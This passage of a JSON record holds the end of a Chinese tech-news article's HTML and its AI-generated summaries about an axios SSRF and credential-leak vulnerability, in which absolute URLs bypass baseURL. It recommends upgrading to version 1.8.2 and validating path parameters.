serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">axios 的这一漏洞再次提醒开发者在使用第三方库时需要密切关注安全更新。建议所有使用 axios 的项目尽快升级到 1.8.2 版本，并在代码中增加对路径参数的验证，以防止类似漏洞的利用。未来，随着 SSRF 攻击的增多，开发者应更加重视对请求 URL 的验证和过滤。</span></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">😀 每天只需花五分钟即可阅读到的技术资讯，加入【早阅】共学，可联系 vx：zhgb_f2er</span></p>\n  <blockquote style=\"box-sizing: border-box;margin-top: 0px;margin-right: 0px;margin-bottom: 0px !important;margin-left: 0px;padding: 0px 1em;color: rgb(119, 119, 119);border-left: 0.25em solid rgb(221, 221, 221);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;\">\n   <p style=\"box-sizing: border-box;margin-top: 0px;margin-bottom: 16px;\"><span leaf=\"\">5 分钟新知：了解外面世界的一种方式。</span></p>\n   <p style=\"box-sizing: border-box;margin-top: 0px;margin-bottom: 0px;\"><span leaf=\"\">🚀可直接通过阅读原文了解详细内容。</span></p>\n  </blockquote>\n  <p style=\"display: none;\"><mp-style-type data-value=\"3\"></mp-style-type></p>\n </body>\n</html>",
  "aiSummary": "Axios 库存在严重 SSRF 和凭据泄露漏洞，由于处理绝对 URL 时忽略 baseURL，建议立即升级至 1.8.2 版本并强化路径参数验证。",
  "oneSentenceSummary": "Axios 库存在严重 SSRF 和凭据泄露漏洞，由于处理绝对 URL 时忽略 baseURL，建议立即升级至 1.8.2 版本并强化路径参数验证。",
  "summary": "文章指出 Axios 库存在一个高危漏洞，该漏洞源于 Axios 在处理绝对 URL 时未正确验证 baseURL，可能导致服务器端请求伪造（SSRF）和敏感凭证泄露。当使用绝对 URL 时，Axios 会忽略 baseURL 的设置，直接将请求发送到指定的绝对 URL。攻击者可以轻易利用此漏洞，影响广泛。文章通过代码示例演示了漏洞利用场景，并说明了可能造成的凭证泄露和 SSRF 攻击风险。文章建议所有使用 Axios 的项目尽快升级到 1.8.2 版本，并在代码中增加对路径参数的验证，以防止类似漏洞的利用。",
  "mainPoints": [
    {
      "point": "Axios 处理绝对 URL 时忽略 baseURL 存在安全隐患",
      "explanation": "当使用绝对 URL 时，Axios 会直接将请求发送到指定的绝对 URL，而忽略预设的 baseURL，导致潜在的安全风险。"
    },
    {
      "point": "该漏洞可能导致凭据泄露和 SSRF 攻击",
      "explanation": "攻击者可构造恶意 URL 获取包含敏感信息的请求头，或利用此漏洞向内部网络中的其他主机发送请求，威胁系统安全。"
    },
    {
      "point": "立即升级 Axios 版本至 1.8.2，并严格验证所有路径参数是抵御此类攻击的有效手段",
      "explanation": "建议所有使用 Axios 的项目尽快升级到 1.8.2 版本，并在代码中增加对路径参数的严格验证，以防止类似漏洞的利用。"
    }
  ],
  "keyQuotes": [
    "当使用绝对 URL 时，axios 会忽略 baseURL 的设置，直接将请求发送到指定的绝对 URL，这可能导致 SSRF 攻击和敏感凭证泄露。",
    "所有使用 baseURL 且未对路径参数进行验证的软件都可能受到影响。",
    "axios 的这一漏洞再次提醒开发者在使用第三方库时需要密切关注安全更新。"
  ],
